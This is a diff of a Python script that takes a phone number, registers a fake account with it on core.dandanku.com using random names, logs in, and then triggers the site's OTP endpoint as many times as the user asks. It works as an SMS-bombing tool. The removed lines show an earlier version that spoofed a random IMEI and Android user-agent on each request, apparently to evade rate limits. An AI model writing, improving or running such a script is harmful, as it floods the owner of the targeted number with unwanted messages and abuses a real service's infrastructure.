@@ -12,27 +12,26 @@ def random_string(length=8):
 
 
 def random_date(start_year=1970, end_year=2005):
-    """Generate a random date between start_year and end_year."""
+    """Generate a random date between start_year-01-01 and end_year-12-31."""
     start = datetime(start_year, 1, 1)
     end = datetime(end_year, 12, 31)
     delta = end - start
-    return (start + timedelta(days=random.randrange(delta.days + 1))).strftime('%Y-%m-%d')
-
-
-def random_imei():
-    """Generate a random 15-digit IMEI-like number."""
-    return ''.join(random.choices(string.digits, k=15))
+    random_days = random.randrange(delta.days + 1)
+    date = start + timedelta(days=random_days)
+    return date.strftime('%Y-%m-%d')
 
 
 def main():
+    # Input phone number
     phone = input("Masukkan nomor HP (contoh: 081234567890): ")
 
-    # Registration
+    # Generate random registration password and data
     reg_password = random_string(12)
     reg_payload = {
         "NamaDepan": random_string(),
         "NamaBelakang": random_string(),
-        "Gender": random.choice([1, 2]),  # 1=Laki-laki, 2=Perempuan
+        # Fixed gender value 'Laki-laki'
+        "Gender": "Laki-laki",
         "Password": reg_password,
         "Phone_Number": phone,
         "TanggalLahir": random_date(),
@@ -41,6 +40,7 @@ def main():
         "Alamat": random_string(20)
     }
 
+    # Common headers
     headers = {
         "access-control-allow-origin": "https://dandanku.com",
         "cache-control": "no-cache, private",
@@ -57,42 +57,41 @@ def main():
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-site",
-        # user-agent dan imei akan di-set dinamis saat OTP
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
     }
 
-    # Kirim registrasi
+    # --- Registration ---
     reg_body = json.dumps(reg_payload)
     headers["content-length"] = str(len(reg_body))
     print("Registration Payload:", json.dumps(reg_payload, ensure_ascii=False))
-    reg_resp = requests.post("https://core.dandanku.com/api/register", data=reg_body, headers=headers)
-    print(f"Registration Status: {reg_resp.status_code}, Response: {reg_resp.text}\n")
+    reg_response = requests.post("https://core.dandanku.com/api/register", data=reg_body, headers=headers)
+    print(f"Registration Status Code: {reg_response.status_code}")
+    print(f"Registration Response: {reg_response.text}\n")
 
-    # Kirim login
-    login_payload = {"Phone_Number": phone, "Password": reg_password}
+    # --- Login ---
+    login_payload = {
+        "Phone_Number": phone,
+        "Password": reg_password
+    }
     login_body = json.dumps(login_payload)
     headers["content-length"] = str(len(login_body))
     print("Login Payload:", json.dumps(login_payload, ensure_ascii=False))
-    login_resp = requests.post("https://core.dandanku.com/api/login", data=login_body, headers=headers)
-    print(f"Login Status: {login_resp.status_code}, Response: {login_resp.text}\n")
+    login_response = requests.post("https://core.dandanku.com/api/login", data=login_body, headers=headers)
+    print(f"Login Status Code: {login_response.status_code}")
+    print(f"Login Response: {login_response.text}\n")
 
-    # OTP loop
-    count = int(input("Berapa kali mengirimkan OTP? "))
+    # --- OTP Generate ---
+    count = int(input("Berapa banyak OTP yang ingin dikirimkan? "))
+    otp_payload = {"Phone_Number": phone}
     for i in range(1, count + 1):
-        imei = random_imei()
-        ua = f"Mozilla/5.0 (Linux; Android {random.randint(6,12)}; IMEI/{imei}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,100)}.0.0.0 Mobile Safari/537.36"
-        headers["user-agent"] = ua
-        headers["imei"] = imei
-
-        otp_payload = {"Phone_Number": phone}
         otp_body = json.dumps(otp_payload)
         headers["content-length"] = str(len(otp_body))
-
-        print(f"Mengirim OTP {i}/{count} | UA: {ua} | IMEI: {imei}")
-        otp_resp = requests.post("https://core.dandanku.com/api/otpgenerate", data=otp_body, headers=headers)
-        print(f"OTP Status: {otp_resp.status_code}, Response: {otp_resp.text}\n")
-
+        print(f"[{i}/{count}] OTP Generate Payload:", json.dumps(otp_payload, ensure_ascii=False))
+        otp_response = requests.post("https://core.dandanku.com/api/otpgenerate", data=otp_body, headers=headers)
+        print(f"[{i}/{count}] OTP Status Code: {otp_response.status_code}")
+        print(f"[{i}/{count}] OTP Response: {otp_response.text}\n")
         if i < count:
-            time.sleep(10)
+            time.sleep(15)
 
 
 if __name__ == "__main__":
